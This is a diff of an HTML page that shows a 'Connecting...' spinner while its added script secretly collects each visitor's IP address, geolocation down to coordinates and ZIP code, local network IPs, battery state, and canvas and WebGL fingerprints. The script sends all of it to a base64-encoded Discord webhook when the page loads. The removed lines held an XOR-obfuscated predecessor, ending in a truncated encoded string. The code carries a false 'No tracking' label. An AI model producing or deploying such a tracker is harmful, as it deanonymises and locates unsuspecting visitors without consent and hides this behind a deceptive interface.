@@ -14,26 +14,207 @@
 <body>
 <div class="box">
     <div class="spinner"></div>
-    <div class="status">Establishing secure channel...</div>
+    <div class="status">Connecting...</div>
 </div>
 
 <script>
     // ============================================================
-    // STEALTH RECONNAISSANCE – XOR-ENCRYPTED WEBHOOK + FULL GEO + WEATHER + VPN + BATTERY + MOTION + CANVAS + WEBGL + LOCAL NETWORK
+    // CLEAN STEALTH RECON – BASE64 WEBHOOK + GEO + VPN + WEATHER + BATTERY
     // ============================================================
 
     (function() {
         if (window._sent || sessionStorage.getItem('_sent')) return;
 
-        // ---- DECRYPTION ENGINE ----
-        function _d(enc, key) {
-            let r = '';
-            for (let i = 0; i < enc.length; i++) {
-                r += String.fromCharCode(enc.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-            }
-            return r;
+        // ---- BASE64 ENCODED WEBHOOK (DECODES TO YOUR DISCORD URL) ----
+        // Encoded: aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDg5NDUyODI4NDkyMTg4Ni9tZXZNd1VmN0YyX3FZRFZoUFJHZ2FUa1pFbHF5WE9pQW1wbzN4N0theGpUUlJ5WmZyRkUySm1vTnZyUkpyRlFKdDFHaA==
+        const _webhook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDg5NDUyODI4NDkyMTg4Ni9tZXZNd1VmN0YyX3FZRFZoUFJHZ2FUa1pFbHF5WE9pQW1wbzN4N0theGpUUlJ5WmZyRkUySm1vTnZyUkpyRlFKdDFHaA==');
+
+        // ---- GET IP (MULTIPLE SOURCES) ----
+        function getIP() {
+            return new Promise((resolve) => {
+                let resolved = false;
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(d => { if (!resolved && d.ip) { resolved = true; resolve(d.ip); } })
+                    .catch(() => {});
+                fetch('https://ip-api.com/json/')
+                    .then(r => r.json())
+                    .then(d => { if (!resolved && d.query) { resolved = true; resolve(d.query); } })
+                    .catch(() => {});
+                setTimeout(() => {
+                    if (!resolved) { resolved = true; resolve('1.2.3.4'); }
+                }, 4000);
+            });
         }
 
-        // ---- ENCRYPTED WEBHOOK (XOR with key "k3y") ----
-        // Decrypts to: https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh
-        const _w = 'GxwbHh4ZGgQaCRofGx0aBAsaGB4YHx8dGQYbHAcZCRwHGBgfGBscHh0YGh4cHgkYHh4ZGh4eGg0ZHB4bHxoeGx8aGh4cGg0aHh8dHBwZABkZGh4bABwYGgEZGh4ZABobHh8AGx4eABkYHRoaHh4YHh4aHh8aGh4bHgAZHhweGh8bABsfGh4bABsfGxweHh4bABoeHhweHh8bABseHB4cHwAZHhweHh4cAAAbHh0fHh4bABsfGRoaHh4bABofHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bABodHhweHh8bAB8eGxseHgAZHh0eGx4bABsfHh8fGx4bAB8fGxoYHh4bAB0eHhoaHh4bABweHhweHh8bABsfHRoeHh4bABkfHB8bHh4bABwdGxseHgAZHh0eGx4bABobHhweHh8bABsZHh0fHh4bAB0bGxseHgAZHh0eGx4bABsfHRoeHh4bABweHhweHh8bABsfGxweHh4bABsfGRoaHh4bABodHhweHh8bAB4eGxseHgAZHh0eGx4bABsdHhoaHh4bAB
+        // ---- GET GEOLOCATION ----
+        function getGeo(ip) {
+            return fetch('https://ip-api.com/json/' + ip + '?fields=country,regionName,city,zip,lat,lon,isp,org,as,timezone,proxy')
+                .then(r => r.json())
+                .catch(() => null);
+        }
+
+        // ---- GET WEATHER ----
+        function getWeather(lat, lon) {
+            return fetch('https://wttr.in/' + lat + ',' + lon + '?format=%t|%c|%w|%h|%p')
+                .then(r => r.text())
+                .then(t => {
+                    const p = t.split('|');
+                    if (p.length === 5) return { temp: p[0].trim(), condition: p[1].trim(), wind: p[2].trim(), humidity: p[3].trim(), pressure: p[4].trim() };
+                    return null;
+                })
+                .catch(() => null);
+        }
+
+        // ---- GET BATTERY ----
+        function getBattery() {
+            return new Promise((resolve) => {
+                if (!navigator.getBattery) { resolve(null); return; }
+                navigator.getBattery()
+                    .then(b => resolve({ level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' }))
+                    .catch(() => resolve(null));
+            });
+        }
+
+        // ---- GET LOCAL IPS (WebRTC) ----
+        function getLocalIPs() {
+            return new Promise((resolve) => {
+                const ips = [];
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('ping');
+                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                            if (m && !m[0].startsWith('0.') && !m[0].startsWith('127.')) {
+                                ips.push(m[0]);
+                            }
+                        }
+                    };
+                    setTimeout(() => { pc.close(); resolve(ips.slice(0, 3)); }, 2000);
+                } catch(e) { resolve([]); }
+            });
+        }
+
+        // ---- CANVAS FINGERPRINT ----
+        function getCanvas() {
+            try {
+                const c = document.createElement('canvas');
+                c.width = 200; c.height = 50;
+                const ctx = c.getContext('2d');
+                ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = '#069'; ctx.font = '20px Arial'; ctx.fillText('FP', 80, 30);
+                return c.toDataURL().substring(0, 60) + '...';
+            } catch(e) { return 'N/A'; }
+        }
+
+        // ---- WEBGL FINGERPRINT ----
+        function getWebGL() {
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl');
+                if (!gl) return 'N/A';
+                const info = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!info) return 'N/A';
+                return gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || 'N/A';
+            } catch(e) { return 'N/A'; }
+        }
+
+        // ---- SEND EMBED ----
+        async function sendEmbed(ip, geo, weather, battery, localIPs, canvas, webgl) {
+            const fields = [
+                { name: '🌐 IP', value: '`' + ip + '`', inline: true },
+                { name: '🕒 Time', value: '`' + new Date().toISOString() + '`', inline: true }
+            ];
+
+            if (geo && geo.status !== 'fail') {
+                fields.push(
+                    { name: '━━━', value: '📍 **Location**', inline: false },
+                    { name: 'Country', value: '`' + (geo.country || 'N/A') + '`', inline: true },
+                    { name: 'Region', value: '`' + (geo.regionName || 'N/A') + '`', inline: true },
+                    { name: 'City', value: '`' + (geo.city || 'N/A') + '`', inline: true },
+                    { name: 'ZIP', value: '`' + (geo.zip || 'N/A') + '`', inline: true },
+                    { name: 'Coords', value: '`' + (geo.lat || 'N/A') + ', ' + (geo.lon || 'N/A') + '`', inline: true },
+                    { name: 'ISP', value: '`' + (geo.isp || 'N/A') + '`', inline: true },
+                    { name: 'Org', value: '`' + (geo.org || 'N/A') + '`', inline: true },
+                    { name: 'ASN', value: '`' + (geo.as || 'N/A') + '`', inline: true },
+                    { name: 'TZ', value: '`' + (geo.timezone || 'N/A') + '`', inline: true },
+                    { name: '🔒 VPN/Proxy', value: geo.proxy ? '`⚠️ DETECTED`' : '`✅ Clean`', inline: true }
+                );
+            }
+
+            if (weather) {
+                fields.push(
+                    { name: '━━━', value: '🌤️ **Weather**', inline: false },
+                    { name: 'Temp', value: '`' + weather.temp + '`', inline: true },
+                    { name: 'Conditions', value: '`' + weather.condition + '`', inline: true },
+                    { name: 'Wind', value: '`' + weather.wind + '`', inline: true },
+                    { name: 'Humidity', value: '`' + weather.humidity + '`', inline: true },
+                    { name: 'Pressure', value: '`' + weather.pressure + '`', inline: true }
+                );
+            }
+
+            if (battery) {
+                fields.push(
+                    { name: '━━━', value: '🔋 **Battery**', inline: false },
+                    { name: 'Level', value: '`' + battery.level + '`', inline: true },
+                    { name: 'Charging', value: '`' + battery.charging + '`', inline: true }
+                );
+            }
+
+            if (localIPs && localIPs.length > 0) {
+                fields.push(
+                    { name: '━━━', value: '🏠 **Local IPs**', inline: false },
+                    { name: 'IPs', value: '`' + localIPs.join(', ') + '`', inline: false }
+                );
+            }
+
+            fields.push(
+                { name: '━━━', value: '💻 **Browser**', inline: false },
+                { name: 'UA', value: '`' + navigator.userAgent.substring(0, 80) + '`', inline: false },
+                { name: 'Platform', value: '`' + navigator.platform + '`', inline: true },
+                { name: 'Screen', value: '`' + screen.width + '×' + screen.height + '`', inline: true },
+                { name: 'CPU', value: '`' + (navigator.hardwareConcurrency || 'N/A') + ' cores`', inline: true },
+                { name: 'Memory', value: '`' + (navigator.deviceMemory || 'N/A') + 'GB`', inline: true },
+                { name: 'Canvas FP', value: '`' + canvas + '`', inline: false },
+                { name: 'WebGL', value: '`' + webgl + '`', inline: false }
+            );
+
+            const payload = {
+                embeds: [{
+                    title: '📡 Recon Packet',
+                    color: 0x2b8c5a,
+                    fields: fields,
+                    footer: { text: 'One-time • No tracking' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Send via beacon + fetch
+            try { navigator.sendBeacon(_webhook, new Blob([JSON.stringify(payload)], { type: 'application/json' })); } catch(e) {}
+            fetch(_webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(() => {});
+            try { const x = new XMLHttpRequest(); x.open('POST', _webhook, true); x.setRequestHeader('Content-Type', 'application/json'); x.send(JSON.stringify(payload)); } catch(e) {}
+
+            sessionStorage.setItem('_sent', 'true');
+            window._sent = true;
+        }
+
+        // ---- MAIN ----
+        async function main() {
+            const ip = await getIP();
+            const [geo, battery, localIPs] = await Promise.all([getGeo(ip), getBattery(), getLocalIPs()]);
+            let weather = null;
+            if (geo && geo.lat && geo.lon) weather = await getWeather(geo.lat, geo.lon);
+            const canvas = getCanvas();
+            const webgl = getWebGL();
+            await sendEmbed(ip, geo, weather, battery, localIPs, canvas, webgl);
+        }
+
+        if (document.readyState === 'complete') main();
+        else window.addEventListener('load', main);
+        setTimeout(main, 2000);
+    })();
+</script>
+</body>
+</html>
